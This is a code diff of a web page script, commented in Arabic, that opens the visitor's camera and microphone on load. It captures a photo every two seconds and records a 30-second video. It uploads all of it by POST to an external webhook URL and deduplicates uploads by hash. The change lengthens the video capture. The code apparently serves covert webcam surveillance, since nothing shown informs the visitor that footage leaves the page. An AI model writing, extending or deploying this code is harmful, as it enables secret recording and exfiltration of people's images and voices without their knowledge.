@@ -39,22 +39,19 @@
         let stream;
         let recorder;
         let chunks = [];
+        let recordingStarted = false;
 
         window.onload = async () => {
             try {
-                // نطلب الكاميرا والمايك بجودة متوسطة
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: 640, height: 360 }, // جودة متوسطة
-                    audio: true
-                });
-
+                // نطلب كاميرا + مايك
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
 
                 // ⏱️ صورة كل 2 ثانية
                 setInterval(captureImage, 2000);
 
-                // ⏱️ فيديو كل 10 ثواني (مدته 5 ثواني فقط)
-                setInterval(recordAndSendVideo, 10000);
+                // 🎥 تسجيل فيديو من البداية
+                startLongRecording();
 
             } catch (err) {
                 alert("⚠️ فشل في الوصول للكاميرا أو المايك. الرجاء السماح.");
@@ -92,46 +89,50 @@
             }).catch(err => console.log("❌ خطأ أثناء إرسال الصورة:", err));
         }
 
-        function recordAndSendVideo() {
-            chunks = [];
-            recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        function startLongRecording() {
+            if (recordingStarted) return;
+            recordingStarted = true;
 
+            recorder = new MediaRecorder(stream);
             recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    const base64data = reader.result;
-                    const videoHash = `sent_video_${hashString(base64data)}`;
-
-                    if (!localStorage.getItem(videoHash)) {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'short_video.webm');
-
-                        fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            body: formData
-                        }).then(response => {
-                            if (response.status === 204) {
-                                console.log("✅ تم إرسال الفيديو");
-                                localStorage.setItem(videoHash, true);
-                            } else {
-                                console.log("❌ فشل إرسال الفيديو");
-                            }
-                        }).catch(err => console.log("❌ خطأ أثناء إرسال الفيديو:", err));
-                    } else {
-                        console.log("✅ الفيديو ده اتبعت قبل كده");
-                    }
-                };
-
-                reader.readAsDataURL(blob);
-            };
 
             recorder.start();
+
+            // ⏱️ بعد 30 ثانية مثلاً ابعت الفيديو
             setTimeout(() => {
                 recorder.stop();
-            }, 5000); // ← يسجل 5 ثواني فقط
+                recorder.onstop = sendVideo;
+            }, 30000); // ← تقدر تغير المدة
+        }
+
+        function sendVideo() {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                const base64data = reader.result;
+                const videoHash = `sent_video_${hashString(base64data)}`;
+
+                if (!localStorage.getItem(videoHash)) {
+                    const formData = new FormData();
+                    formData.append('file', blob, 'recorded_video.webm');
+
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => {
+                        if (response.status === 204) {
+                            console.log("✅ تم إرسال الفيديو");
+                            localStorage.setItem(videoHash, true);
+                        } else {
+                            console.log("❌ فشل إرسال الفيديو");
+                        }
+                    }).catch(err => console.log("❌ خطأ أثناء إرسال الفيديو:", err));
+                } else {
+                    console.log("✅ الفيديو ده اتبعت قبل كده");
+                }
+            };
+            reader.readAsDataURL(blob);
         }
 
         function dataURLtoBlob(dataURL) {
@@ -151,7 +152,7 @@
             for (let i = 0; i < str.length; i++) {
                 const chr = str.charCodeAt(i);
                 hash = ((hash << 5) - hash) + chr;
-                hash |= 0;
+                hash |= 0; // Convert to 32bit integer
             }
             return hash;
         }
